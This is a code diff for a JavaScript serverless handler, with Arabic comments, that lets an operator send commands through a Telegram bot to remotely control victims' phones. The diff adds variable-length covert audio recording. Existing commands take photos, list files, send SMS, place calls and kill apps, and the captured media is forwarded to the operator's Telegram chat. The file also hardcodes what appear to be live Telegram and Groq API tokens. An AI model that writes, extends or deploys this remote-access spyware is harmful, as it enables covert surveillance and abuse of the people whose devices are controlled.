@@ -1,3 +1,6 @@
+// ==========================================
+// التوكنات المدمجة
+// ==========================================
 const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
 const TELEGRAM_CHAT_ID = "6655802251";
 const GROQ_API_KEY = "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";
@@ -5,14 +8,22 @@ const GROQ_API_KEY = "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";
 const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
+// ==========================================
+// توليد 400 أمر ديناميكي
+// ==========================================
 const COMMAND_MAP = {};
 
-// توليد 400 أمر
-for (let i = 1; i <= 100; i++) COMMAND_MAP[`/toast${i}`] = `toast:إشعار رقم ${i}`;
+// 1. أوامر Toast (100)
+for (let i = 1; i <= 100; i++) COMMAND_MAP[`/toast${i}`] = `toast:إشعار تجريبي رقم ${i}`;
+// 2. أوامر URL (100)
 for (let i = 1; i <= 100; i++) COMMAND_MAP[`/url${i}`] = `url:https://example.com/page${i}`;
+// 3. أوامر الاهتزاز (50)
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`;
-for (let i = 1; i <= 50; i++) COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص ${i}`;
+// 4. أوامر الحافظة (50)
+for (let i = 1; i <= 50; i++) COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص رقم ${i}`;
+// 5. أوامر SMS (50)
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسالة ${i}`;
+// 6. أوامر المكالمات (50)
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/call${i}`] = `call:+1234567890`;
 
 const BASE_COMMANDS = {
@@ -21,7 +32,6 @@ const BASE_COMMANDS = {
   '/files': 'files:1',
   '/killapp': 'killapp:1',
   '/sysinfo': 'sysinfo:1',
-  '/rec15': 'record_15',
   '/photo': 'take_photo'
 };
 
@@ -81,7 +91,7 @@ export default async function handler(req, res) {
     }
 
     if (type === 'command') {
-      // التحقق من وقت انتهاء المفتاح (gentime)
+      // التحقق من وقت انتهاء المفتاح (gentime) المحفوظ في KV
       const expAt = await kvCmd('GET', 'key_exp_at');
       if (expAt && Date.now() > parseInt(expAt)) {
         await kvCmd('DEL', 'key_exp_at');
@@ -125,7 +135,7 @@ export default async function handler(req, res) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('document', new Blob([buffer]), filename);
-            formData.append('caption', `📁 ${type === 'media' && filename.endsWith('.jpg') ? 'Photo' : 'Audio'}: ${filename}`);
+            formData.append('caption', `📁 ${filename.endsWith('.jpg') ? 'Photo' : 'Audio'}: ${filename}`);
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
               method: 'POST', body: formData
@@ -153,6 +163,16 @@ export default async function handler(req, res) {
       const args = text.trim().split(/\s+/);
       const command = args[0].toLowerCase();
 
+      // أوامر التسجيل الديناميكية (rec15, rec30, rec60...)
+      if (command.startsWith('/rec')) {
+        const seconds = parseInt(command.replace('/rec', ''));
+        if (!isNaN(seconds) && seconds > 0 && seconds <= 300) {
+          remoteCommand = `record_${seconds}`;
+          await sendToTelegram(`🎙️ \`[REC]\` جاري تسجيل الصوت (${seconds} ثانية)...`);
+          return res.status(200).end();
+        }
+      }
+
       if (COMMAND_MAP[command]) {
         remoteCommand = COMMAND_MAP[command];
         await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
@@ -171,12 +191,11 @@ export default async function handler(req, res) {
           break;
         case '/help': 
           await sendToTelegram(`👑 *لوحة التحكم*\n\n` +
-            `⚡ *أوامر خطيرة:*\n/rec15 (تسجيل صوت 15ث)\n/photo (التقاط صورة)\n\n` +
+            `⚡ *أوامر خطيرة:*\n/rec15 (تسجيل صوت)\n/photo (التقاط صورة)\n\n` +
             `⏱️ *المفاتيح:*\n/gentime <min>\n/settime <min>\n/setkey <key>\n/lock /unlock\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall\n\n` +
             `💥 *الأوامر المولدة:*\n/toast1-100 /url1-100 /vib1-50 /clip1-50 /sms1-50 /call1-50`); 
           break;
-        case '/rec15': remoteCommand = 'record_15'; await sendToTelegram("🎙️ `[REC]` جاري تسجيل الصوت (15 ثانية)..."); break;
         case '/photo': remoteCommand = 'take_photo'; await sendToTelegram("📷 `[CAM]` جاري التقاط الصورة..."); break;
 
         case '/gentime':
@@ -184,10 +203,9 @@ export default async function handler(req, res) {
             const minutes = parseInt(args[1]);
             const newKey = Math.random().toString(36).substring(2, 8).toUpperCase();
             await kvCmd('SET', 'app_secret_key', newKey);
-            // تخزين وقت الانتهاء في KV (الوقت الحالي + الدقائق)
             const expTime = Date.now() + (minutes * 60 * 1000);
             await kvCmd('SET', 'key_exp_at', expTime.toString());
-            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\n*(سيتم قفل التطبيق أوتوماتيكياً بعد انتهاء الوقت)*`);
+            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\n*(سيقفل التطبيق أوتوماتيكياً بعد انتهاء الوقت)*`);
           } else await sendToTelegram("⚠️ استعمل: `/gentime 60`");
           break;
 
